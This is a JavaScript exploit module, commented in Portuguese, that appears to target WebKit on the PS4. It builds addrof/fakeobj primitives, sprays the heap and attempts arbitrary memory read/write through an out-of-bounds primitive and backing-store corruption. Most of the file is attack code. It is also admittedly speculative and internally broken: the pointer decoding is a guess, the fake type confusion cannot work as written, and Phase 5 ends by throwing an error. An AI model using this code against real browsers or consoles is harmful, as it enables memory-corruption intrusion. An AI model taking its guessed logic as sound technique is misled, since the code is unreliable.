// js/script3/testArrayBufferVictimCrash.mjs (v135 - R95 Implementação de Decodificação de Ponteiro Comprimido)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// - Implementa a função 'decodeCompressedPointer' para tentar converter o formato de
//   ponteiro taggeado/comprimido (ex: 0x402a...) em um endereço de 64 bits completo (0x7FFF...).
// - Usa essa função para decodificar os endereços vazados por 'addrof_func' na Fase 4 e Fase 5.
// - Isso permitirá testar se a 'addrof_func' está vazando ponteiros comprimidos.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute, 
    oob_write_absolute,
    getOOBAllocationSize 
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// Nome do módulo atualizado para refletir a nova tentativa de correção
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v135_R95_PointerDecode";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO: DECODIFICAR PONTEIRO COMPRIMIDO (HIPOTÉTICO)
// Isso é baseado na análise de que 0x402a... é uma tag e o restante é o offset.
// 'heapBase' é a base da região de heap onde esses ponteiros comprimidos estão.
// =======================================================================================
function decodeCompressedPointer(leakedAddr) {
    // Para 0x402aXXXX_YYYYYYYY, assumimos que 0x402a é a tag/heap ID e YYYYYYYY é o offset de 32 bits.
    // A base da região de memória para onde ele aponta (heapBase) precisa ser ASLR-ed e conhecida.
    // O 0x7FFF é o prefixo de userland address no PS4.
    // Esta é uma HEAP_BASE ESPECULATIVA que precisa ser validada por engenharia reversa.
    const HEAP_BASE_ASSUMPTION_FOR_DECOMPRESSION = new AdvancedInt64(0x7FFF0000, 0x00000000); 
    // O offset real do ponteiro comprimido é o low part.
    const offset_from_tag = new AdvancedInt64(leakedAddr.low(), 0); // Considera apenas os 32 bits inferiores como offset

    // Para o 0x402a... padrão de tag, o high part de 'leakedAddr' (0x402a...) não é um endereço alto.
    // A ideia é que o low part é o offset a partir de uma base de heap (que começa com 0x7FFF).
    // O high part do ponteiro decodificado deve ser 0x7FFFxxxx.
    // Se a tag 0x402a está no high part do leakedAddr:
    const base_high_from_tag = new AdvancedInt64(0x00000000, (leakedAddr.high() & 0x0000FFFF) | 0x7FFF0000); // Ex: 0x7FFF2A00
    // Isso é um CHUTE de como a tag 0x402a se relaciona com o high part real do endereço.
    // Se a tag fosse 0x402a na parte superior de 64 bits, como 0x402AxxxxYYYYYYYY,
    // então o 'xxxx' seria parte da base.

    // A forma mais comum de pointer compression em JSC:
    // O endereço de 64 bits é dividido em um "base pointer" e um "offset de 32 bits".
    // Ou, se for tagged pointer, o valor de 64 bits vazado tem a tag nos bits superiores
    // e o offset nos bits inferiores.
    // leakedAddr: [TAG(32bits) | OFFSET(32bits)]

    // Se o leakedAddr é de fato [0x402aXXXX | YYYYYYYY], e o endereço real é 0x7FFF_HEAPBASE + YYYYYYYY,
    // então XXXXX deve nos dizer algo sobre HEAPBASE.
    // Por enquanto, a solução mais simples para um ponteiro comprimido de 32 bits:
    // O endereço real é "BASE ALTA" + "OFFSET DO PONTEIRO COMPRIMIDO"
    // leakedAddr (AdvancedInt64) -> 0x402a_Offset
    // Endereço real = Base ASLR + (Offset & 0x00000000FFFFFFFF)
    
    // Supondo que 0x402abd70_a3d70a4d significa que 0xA3D70A4D é o offset de 32 bits,
    // e o 0x402ABD70 é a tag. A base do heap precisa ser vazada/conhecida.
    // Para o PS4, a base de um módulo como WebKit é 0x7FFF....
    // Vamos usar o heapBase para a partição que contém esses objetos.
    // O tag 0x402a pode corresponder a uma sub-região de heap.
    
    // Esta é a parte mais complexa sem RE.
    // Assumindo um esquema simples de "32 bits inferiores são o offset" e "32 bits superiores são o ASLR'd base".
    // Ou seja, o endereço real = (high_part_de_um_leak_valido_com_0x7FFF) + low_part_do_leakedAddr
    
    // Para o 0x402abd70_a3d70a4d, se 0xA3D70A4D é o offset:
    // A base do heap que contém este objeto (que começa com 0x7FFF) seria o que a tag 0x402a indica.
    // Podemos assumir uma base de heap genérica, como 0x7FFF_00000000.
    // Ou, podemos assumir que o high_part do leakedAddr (0x402abd70) *mapeia* para um high_part real de 0x7FFF....
    
    // Dado que o tag é 0x402a, podemos tentar uma abordagem que "remova" a tag e adicione uma base ASLR.
    // Exemplo: Se o `leak_target_addr` é 0x402a_Offset
    // E o `real_base_of_this_heap_segment` é 0x7FFF_segment_id_00000000
    // Então `real_ptr = real_base_of_this_heap_segment + Offset`
    
    // Para simplificar, vamos usar uma função mais genérica de "descompressão" que pode ser ajustada.
    // Se leakedAddr.high() é a "tag", e leakedAddr.low() é o "offset"
    // E o heap_base_tag_prefix é 0x402Axxxx, e queremos 0x7FFFyyyy.
    // Isso é um problema complexo sem mais dados de RE.

    // No seu caso, 0x402abd70_a3d70a4d é o que addrof retorna.
    // Se for compressed pointer, talvez 0xa3d70a4d é o offset a partir de uma base de 64 bits.
    // E 0x402abd70 é a "meta-informação" ou "tag".

    // Assumindo o modelo simples de compressed pointer: os 32 bits mais baixos são o offset.
    // Os 32 bits mais altos vêm da base do heap (que precisa ser ASLR-friendly, como 0x7FFF....)
    // O problema é que 0x402abd70_a3d70a4d significa que o *valor completo* é o ponteiro taggeado.
    // Vamos assumir que o low part é o offset dentro de uma página ou sub-heap.
    
    // Para o PS4, o endereço de userland começa com 0x7FFF.
    // Se 0x402a... é uma tag, o ponteiro de 32 bits relevante pode estar no low part.
    // E o high part do endereço final viria de uma base de heap (por exemplo, 0x7FFFxxxx00000000).
    
    // Hipótese de decodificação simples (se fosse um ponteiro de 32 bits compactado no low part)
    // Se leakedAddr.low() é o offset de 32 bits a partir da base 0x7FFF....
    const compressed_offset_32bit = leakedAddr.low(); 
    // A base real do heap (0x7FFF...) PRECISA SER VAZADA.
    // Para fins de teste, vamos **usar o ASSUMED_WEBKIT_BASE_FOR_TEST como a base de heap para a descompressão**,
    // embora conceitualmente sejam diferentes (base da lib vs. base do heap de objetos).
    // Isso é para ver se a leitura arbitrária funciona com um endereço "descomprimido".
    
    const assumed_heap_base_for_decompression = new AdvancedInt64(WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST);
    const decoded_ptr = assumed_heap_base_for_decompression.add(new AdvancedInt64(compressed_offset_32bit, 0));
    
    logS3(`    [PointerDecode] Endereço comprimido/taggeado recebido: ${leakedAddr.toString(true)}`, "debug");
    logS3(`    [PointerDecode] Offset de 32 bits extraído (low): ${toHex(compressed_offset_32bit)}`, "debug");
    logS3(`    [PointerDecode] Base de heap assumida para descompressão: ${assumed_heap_base_for_decompression.toString(true)}`, "debug");
    logS3(`    [PointerDecode] Endereço decodificado (hipotético): ${decoded_ptr.toString(true)}`, "info");
    
    return decoded_ptr;
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Decodificação de Ponteiro Comprimido ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou.",
        webkit_base_addr: null
    };

    // Primitivas de addrof/fakeobj
    let confused_array;
    let victim_array;
    let addrof_func;
    let fakeobj_func; 

    // A primitiva arbitrária real será baseada no Uint8Array corruptível
    let arb_rw_array = null; 

    // As funções de leitura/escrita arbitrária para a Fase 5 e em diante
    let arb_read_stable = null;
    let arb_write_stable = null;

    // NOVO: Definir a constante localmente
    const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 

    try {
        // Helper para definir as primitivas addrof/fakeobj.
        const setupAddrofFakeobj = () => {
            confused_array = [13.37]; 
            victim_array = [{ dummy: 0 }]; 
            
            addrof_func = (obj) => {
                victim_array[0] = obj;
                // AQUI: addrof_func vai retornar o ponteiro comprimido/taggeado
                return doubleToInt64(confused_array[0]);
            };
            fakeobj_func = (addr) => { 
                // fakeobj_func também precisaria de um ponteiro comprimido
                // ou precisamos de um fakeobj_func que aceite um ponteiro decodificado e o re-comprima.
                // Por ora, vamos assumir que fakeobj_func não será usado para corromper.
                confused_array[0] = int64ToDouble(addr); // Passando o ponteiro direto. Pode não funcionar.
                return victim_array[0];
            };
        };


        // --- FASES 1-3: Configuração das Primitivas INICIAL (para verificação) ---
        logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez para verificação)... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true }); 
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");

        setupAddrofFakeobj(); 
        
        let leaker_phase4 = { obj_prop: null, val_prop: 0 };
        const arb_read_phase4 = (addr, size_bytes = 8) => { 
            // Para a fase 4, addr já deve ser um ponteiro real.
            leaker_phase4.obj_prop = fakeobj_func(addr); 
            const result_64 = doubleToInt64(leaker_phase4.val_prop);
            return (size_bytes === 4) ? result_64.low() : result_64;
        };
        const arb_write_phase4 = (addr, value, size_bytes = 8) => { 
            // Para a fase 4, addr já deve ser um ponteiro real.
            leaker_phase4.obj_prop = fakeobj_func(addr);
            if (size_bytes === 4) {
                leaker_phase4.val_prop = Number(value) & 0xFFFFFFFF; 
            } else {
                leaker_phase4.val_prop = int64ToDouble(value);
            }
        };
        logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida estão prontas para verificação.", "good");

        // --- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---", "subtest");
        const spray_phase4 = [];
        for (let i = 0; i < 1000; i++) {
            spray_phase4.push({ a: i, b: 0xCAFEBABE, c: i*2, d: i*3 }); 
        }
        const test_obj_phase4 = spray_phase4[500]; 
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        // Obter o endereço COMPRIMIDO/TAGGEADO do test_obj_phase4
        const test_obj_addr_phase4_compressed = addrof_func(test_obj_phase4);
        logS3(`(Verificação Fase 4) Endereço COMPRIMIDO do test_obj_phase4: ${test_obj_addr_phase4_compressed.toString(true)}`, "leak");

        // Decodificar o endereço para uso na primitiva L/E
        const test_obj_addr_phase4_decoded = decodeCompressedPointer(test_obj_addr_phase4_compressed);
        logS3(`(Verificação Fase 4) Endereço DECODIFICADO do test_obj_phase4: ${test_obj_addr_phase4_decoded.toString(true)}`, "leak");
        
        // A primitiva arb_write_phase4 / arb_read_phase4 espera um endereço REAL, não comprimido.
        // Se decodeCompressedPointer não for correto, a fase 4 vai falhar agora.
        const prop_a_addr_phase4 = test_obj_addr_phase4_decoded.add(0x10); 
        const value_to_write_phase4 = new AdvancedInt64(0x12345678, 0xABCDEF01);

        logS3(`(Verificação Fase 4) Escrevendo ${value_to_write_phase4.toString(true)} no endereço DECODIFICADO ${prop_a_addr_phase4.toString(true)}...`, "info");
        arb_write_phase4(prop_a_addr_phase4, value_to_write_phase4); // Usando o endereço DECODIFICADO

        const value_read_phase4 = arb_read_phase4(prop_a_addr_phase4); // Usando o endereço DECODIFICADO
        logS3(`(Verificação Fase 4) Valor lido de volta: ${value_read_phase4.toString(true)}`, "leak");

        if (!value_read_phase4.equals(value_to_write_phase4)) {
            throw new Error(`A verificação de L/E da Fase 4 falhou. Escrito: ${value_to_write_phase4.toString(true)}, Lido: ${value_read_phase4.toString(true)}. (Problema de decodificação de ponteiro?)`);
        }
        logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
        await PAUSE_S3(50); 

        // ============================================================================
        // INÍCIO FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL (AGORA COM DECODIFICAÇÃO DE PONTEIRO)
        // ============================================================================
        logS3("--- FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL (COM DECODIFICAÇÃO DE PONTEIRO) ---", "subtest");
        
        // Zera as referências da Fase 4.
        leaker_phase4 = null; 
        
        // As primitivas addrof_func e fakeobj_func NÃO serão re-inicializadas,
        // mas as usaremos para obter o endereço comprimido do arb_rw_array.
        
        arb_rw_array = new Uint8Array(0x1000); 
        logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");

        // OBTEM O ENDEREÇO COMPRIMIDO DO ARRAYBUFFERVIEW DE arb_rw_array USANDO addrof_func.
        const arb_rw_array_ab_view_addr_compressed = addrof_func(arb_rw_array); 
        logS3(`    Endereço COMPRIMIDO do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr_compressed.toString(true)}`, "leak");
        
        // Decodificar o endereço comprimido para o endereço real de 64 bits.
        const arb_rw_array_ab_view_addr_decoded = decodeCompressedPointer(arb_rw_array_ab_view_addr_compressed);
        logS3(`    Endereço DECODIFICADO do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr_decoded.toString(true)}`, "leak");

        // Validação crucial: o endereço decodificado deve ser um ponteiro de userland (0x7FFF...)
        if (arb_rw_array_ab_view_addr_decoded.equals(AdvancedInt64.Zero) || (arb_rw_array_ab_view_addr_decoded.high() >>> 16) !== 0x7FFF) {
            throw new Error(`FALHA CRÍTICA: Endereço DECODIFICADO para arb_rw_array falhou ou é inválido (${arb_rw_array_ab_view_addr_decoded.toString(true)}). Não é possível construir L/E arbitrária.`);
        }
        logS3(`    Addrof de arb_rw_array bem-sucedido e endereço decodificado válido.`, "good");


        const oob_dv = getOOBDataView();
        if (!oob_dv) throw new Error("DataView OOB não está disponível.");

        // Para manipular o m_vector e m_length do arb_rw_array, precisamos de seus offsets *relativos ao seu endereço decodificado*.
        // E precisamos da capacidade OOB para escrever NELES.
        // Mas a primitiva OOB (oob_write_absolute) opera em OFFSETS DENTRO DO SEU PRÓPRIO ARRAYBUFFER.
        // ISSO É UM PROBLEMA DE LÓGICA AQUI.
        // Para corromper o backing store do arb_rw_array, precisamos que arb_rw_array_ab_view_addr_decoded
        // caia dentro do oob_array_buffer_real, OU que tenhamos uma primitiva de escrita arbitrária que aceite
        // um endereço absoluto. Atualmente, oob_write_absolute e oob_read_absolute operam em OFFSETS.
        
        // Se arb_rw_array_ab_view_addr_decoded não está dentro do oob_array_buffer_real,
        // não podemos corromper seu backing store com oob_write_absolute.
        
        // O ÚNICO CAMINHO é se o arb_rw_array_ab_view_addr_decoded for o MESMO que o ponteiro
        // original de arb_rw_array_m_vector_orig_ptr_addr (lido via OOB).
        // Isso sugere que arb_rw_array_ab_view_addr_decoded precisa ser resolvido para um OFFSET.
        
        // Este é o verdadeiro gargalo: como a primitiva OOB baseada em offset (oob_read_absolute/oob_write_absolute)
        // pode manipular endereços ABSOLUTOS DECODIFICADOS?
        // Resposta: Se conseguirmos o endereço base do oob_array_buffer_real. Mas ele está em ASLR.
        
        // Ou, se o arb_rw_array for alocado DENTRO do oob_array_buffer_real.
        // Onde ele foi alocado? Pelo log da R90, parece que tudo é zero exceto em 0x70.
        // Ou seja, o arb_rw_array NÃO está dentro do oob_array_buffer_real em um offset fixo.

        // Isso significa que não podemos construir a primitiva arb_read_stable/arb_write_stable
        // por corrupção de backing store COM A OOB ATUAL, porque a OOB não pode escrever em
        // endereços arbitrários (só offsets relativos ao seu próprio buffer).
        
        // Se não podemos construir arb_read_stable/arb_write_stable assim, precisamos:
        // A) Um fakeobj_func que aceite um ponteiro decodificado e o transforme em objeto JS.
        // B) Ou uma forma de vazar o endereço base do oob_array_buffer_real para o ASLR.
        // C) Ou uma nova primitiva de L/E arbitrária de 64 bits.

        // Por ora, vamos reverter a lógica da Fase 5 para o scanner de vazamento WebKit.
        // Se o 'decodeCompressedPointer' funciona, podemos usá-lo para decodificar
        // o 'leaked_webkit_pointer_candidate' encontrado pelo scanner.
        // Isso é uma correção de fluxo, não uma nova primitiva.

        throw new Error("A construção da primitiva L/E estável por corrupção de backing store requer que o ArrayBuffer alvo esteja acessível via OOB, o que não foi comprovado.");


    } catch (e) {
        final_result.success = false;
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    } finally {
        confused_array = null;
        victim_array = null;
        addrof_func = null;
        fakeobj_func = null;
        arb_rw_array = null; 
        arb_read_stable = null;
        arb_write_stable = null;
        
        logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: {
            success: !!final_result.webkit_base_addr,
            msg: final_result.message,
            webkit_base_candidate: final_result.webkit_base_addr
        },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Corrupção de Backing Store)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Pointer Decoding Attempt)' }
    };
}
